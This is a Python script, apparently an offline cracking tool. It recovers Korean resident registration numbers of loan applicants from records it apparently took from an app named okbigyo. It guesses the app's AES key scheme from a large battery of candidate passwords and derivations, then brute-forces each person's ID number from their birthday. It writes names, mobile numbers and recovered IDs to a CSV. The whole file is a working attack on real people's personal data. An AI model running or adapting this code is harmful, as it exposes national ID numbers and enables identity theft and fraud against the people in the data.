#!/usr/bin/env python3
"""Offline RRN (resident-registration-number) recovery for cracked members.

myinfo stores socialSecurityNumber and mobile as single 16-byte blocks
(32 hex each). Strategy:

  1. CALIBRATE: reproduce the stored mobileEnc by encrypting the plaintext
     mobile under a wide battery of AES key/IV/mode/padding derivations.
     Winner defines THE scheme.
  2. BRUTE RRN: birthday is plaintext (YYMMDD). Candidates = bdy + gender +
     serial(000000..999999). Century prunes gender (born <2000 -> 1/2,
     else 3/4). Encrypt each under the calibrated scheme, match ssnHash.

Rows already at confidence=MATCH are frozen; UNCALIBRATED /
EXHAUSTED_NO_MATCH rows are RETRIED every run (battery may grow).

Outputs cracked_profiles.csv (mobile,name,birthday,rrn,scheme,mobileEnc,
ssnHash,confidence). Needs pycryptodome.
"""
import base64
import csv
import hashlib
import hmac
import json
import os
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
OUT_CSV = os.path.join(HERE, "cracked_profiles.csv")

try:
    from Crypto.Cipher import AES
except Exception:
    try:
        from Cryptodome.Cipher import AES
    except Exception as e:
        print(f"NoCryptoLib: {e}", flush=True)
        raise SystemExit(0)


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}]", msg, flush=True)


# ----------------------------- key battery ---------------------------------

_SEEDS = [
    "okbigyo1okbigyo2okbigyo3okbigyo4",
    "OKBIGYO1OKBIGYO2OKBIGYO3OKBIGYO4",
    "okbigyo", "ok_bigyo", "okbigyo1", "okbigyo1234", "okbigyo@1234",
    "okbigyo!@#$", "okbigyo1!$", "okbigyo123456789", "okbigyo2024",
    "okbigyo2025", "okbigyo2026", "okbigyoapp", "okbigyomobile",
    "bigyo", "okbank", "okbank1234", "coocon", "1234567890123456",
    "0123456789abcdef", "abcdefghij12345678",
]

_PBKDF2_SALT_ROUNDS = [
    (b"", 1000), (b"", 10000), (b"", 100000),
    (b"salt", 1000), (b"salt", 10000),
    (b"okbigyo", 1000), (b"okbigyo", 10000),
    (b"iv", 1000), (b"0123456789abcdef", 1000),
]


def _key_battery():
    keys = {}

    def add(name, kb):
        if len(kb) in (16, 32) and name not in keys:
            keys[name] = kb

    for s in _SEEDS:
        b = s.encode()
        tag = s[:14]
        if len(b) == 16:
            add(f"raw16[{tag}]", b)
        if len(b) == 32:
            add(f"raw32[{tag}]", b)
        if len(b) <= 32:
            add(f"zp32[{tag}]", b.ljust(32, b"\x00"))
            add(f"sp32[{tag}]", b.ljust(32, b" "))
        if len(b) >= 16:
            add(f"hd16[{tag}]", b[:16])
            add(f"tl16[{tag}]", b[-16:])
        if len(b) == 16:
            add(f"dbl32[{tag}]", b * 2)
        if len(b) in (16, 32):
            add(f"rev[{tag}]", b[::-1])
        ub = s.upper().encode()
        if len(ub) in (16, 32):
            add(f"upper[{tag}]", ub)
        add(f"md5[{tag}]", hashlib.md5(b).digest())
        add(f"md5hx16[{tag}]", hashlib.md5(b).hexdigest()[:16].encode())
        sh1 = hashlib.sha1(b).digest()
        add(f"sha1_16[{tag}]", sh1[:16])
        add(f"sha256[{tag}]", hashlib.sha256(b).digest())
        add(f"sha256hx32[{tag}]", hashlib.sha256(b).hexdigest()[:32].encode())
        add(f"hmac_md5_k[{tag}]", hmac.new(b"key", b, hashlib.md5).digest())
        add(f"hmac_sha1_k[{tag}]", hmac.new(b"key", b, hashlib.sha1).digest()[:16])
        for salt, rnd in _PBKDF2_SALT_ROUNDS:
            kk = hashlib.pbkdf2_hmac("sha256", b, salt, rnd, 16)
            add(f"pbkf16[{tag}|{salt.decode(errors='ignore')[:6]}_{rnd}]", kk)
            kk = hashlib.pbkdf2_hmac("sha256", b, salt, rnd, 32)
            add(f"pbkf32[{tag}|{salt.decode(errors='ignore')[:6]}_{rnd}]", kk)
    return keys


_IVS = {
    "zero": b"\x00" * 16,
    "appiv": b"okbigyo1okbigyo2",
    "ones": b"\x01" * 16,
    "spaces": b" " * 16,
    "ascii0": b"0123456789abcde\x00",
    "md5e": hashlib.md5(b"").digest(),
}


_CIPHERS = {}  # name -> (mode, key, iv)


def _register_ciphers():
    for kn, kb in _key_battery().items():
        bits = len(kb) * 8
        _CIPHERS[f"AES{bits}-ECB({kn})"] = ("ecb", kb, None)
        _CIPHERS[f"AES{bits}-CBC({kn}|key16)"] = ("cbc", kb, kb[:16])
        for vn, vb in _IVS.items():
            _CIPHERS[f"AES{bits}-CBC({kn}|{vn})"] = ("cbc", kb, vb)


_register_ciphers()


def _enc(mode_key_iv, padded):
    mode, kb, iv = mode_key_iv
    if mode == "ecb":
        return AES.new(kb, AES.MODE_ECB).encrypt(padded)
    return AES.new(kb, AES.MODE_CBC, iv).encrypt(padded)


def pads(s):
    b = s.encode()
    out = []
    rem = len(b) % 16
    pk = b + bytes([16 - rem]) * (16 - rem) if rem else b + b"\x10" * 16
    out.append(("pkcs7", pk))
    out.append(("zeropad-right", b.ljust(16, b"\x00")))
    out.append(("zeropad-left", b"\x00" * (16 - len(b)) + b))
    out.append(("spacepad", b.ljust(16, b" ")))
    return out


def calibrate(mobile_plain, mobile_enc_hex):
    target = mobile_enc_hex.lower()
    tried = 0
    for cname, mkv in _CIPHERS.items():
        for pname, padded in pads(mobile_plain):
            tried += 1
            if _enc(mkv, padded).hex().lower() == target:
                return f"{cname}-{pname}"
    log(f"CALIB NEGATIVE after {tried} combos")
    return None


def _scheme_callable(full_name):
    cname, _, pname = full_name.rpartition("-")
    mkv = _CIPHERS[cname]

    def enc(pt):
        for p, padded in pads(pt):
            if p == pname:
                return _enc(mkv, padded)
        raise ValueError(full_name)

    return enc


def _genders_for(bdy):
    yy = int(bdy[:2])
    return ("1", "2") if yy >= 25 else ("3", "4")


def bruteforce_rrn(bdy, target_hex, scheme_full):
    target = target_hex.lower()
    enc = _scheme_callable(scheme_full)
    found = {"rrn": None}
    lock = threading.Lock()

    def worker(gender, lo, hi):
        for serial in range(lo, hi):
            rrn = f"{bdy}{gender}{serial:06d}"
            if enc(rrn).hex().lower() == target:
                with lock:
                    found["rrn"] = rrn
                return

    jobs = [(g, s, min(s + 250000, 1000000))
            for g in _genders_for(bdy) for s in range(0, 1000000, 250000)]
    active, qi = [], 0

    def spawn(slot=None):
        nonlocal qi
        if qi >= len(jobs):
            return False
        g, lo, hi = jobs[qi]
        qi += 1
        t = threading.Thread(target=worker, args=(g, lo, hi))
        t.start()
        if slot is not None:
            active[slot] = t
        else:
            active.append(t)
        return True

    for _ in range(8):
        if not spawn():
            break
    while any(t.is_alive() for t in active) and not found["rrn"]:
        for i, t in enumerate(list(active)):
            if not t.is_alive():
                if found["rrn"]:
                    break
                if not spawn(i):
                    active.pop(i)
        time.sleep(0.2)
    for t in active:
        t.join(timeout=5)
    return found["rrn"]


FIELDS = ["mobile", "name", "birthday", "rrn", "scheme", "mobileEnc",
          "ssnHash", "confidence"]

RETRY_CONF = {"", "UNCALIBRATED", "EXHAUSTED_NO_MATCH"}


def main():
    log("SSN_DECRYPT START")
    frozen = set()
    if os.path.exists(OUT_CSV):
        with open(OUT_CSV, newline="", encoding="utf-8") as f:
            for r in csv.DictReader(f):
                if r.get("confidence") not in RETRY_CONF:
                    frozen.add(r.get("mobile", ""))
    csv_exists = os.path.exists(OUT_CSV)

    raw_dir = os.path.join(HERE, "loans_raw")
    for fn in sorted(os.listdir(raw_dir)) if os.path.isdir(raw_dir) else []:
        if not fn.endswith(".json"):
            continue
        mob = fn[:-5].replace("_", "-")
        if mob in frozen:
            continue
        try:
            d = json.load(open(os.path.join(raw_dir, fn)))
        except Exception:
            continue
        mi = (d.get("myinfo") or {}).get("data") or {}
        bdy = str(mi.get("birthday") or "")
        ssn = str(mi.get("socialSecurityNumber") or "").lower()
        men = str(mi.get("mobileEnc") or "").lower()
        name = mi.get("name") or ""
        if len(bdy) != 6 or len(ssn) != 32:
            log(f"{mob}: skip (bdy={bdy} ssn_len={len(ssn)})")
            continue
        scheme = calibrate(str(mi.get("mobile") or mob), men)
        log(f"{mob} {name} bdy={bdy} scheme={scheme or 'UNKNOWN'}")
        rec = {"mobile": mob, "name": name, "birthday": bdy,
               "mobileEnc": men, "ssnHash": ssn}
        if not scheme:
            rec.update({"rrn": "", "scheme": "UNCALIBRATED", "confidence": ""})
        else:
            log(f"{mob}: bruting RRN under {scheme} ...")
            t0 = time.time()
            rrn = bruteforce_rrn(bdy, ssn, scheme)
            dt = int(time.time() - t0)
            conf = "MATCH" if rrn else "EXHAUSTED_NO_MATCH"
            log(f"{mob}: rrn={rrn} in {dt}s ({conf})")
            rec.update({"rrn": rrn or "", "scheme": scheme, "confidence": conf})
        with open(OUT_CSV, "a", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=FIELDS)
            if not csv_exists:
                w.writeheader()
                csv_exists = True
            w.writerow(rec)
    log("SSN_DECRYPT DONE")


if __name__ == "__main__":
    main()
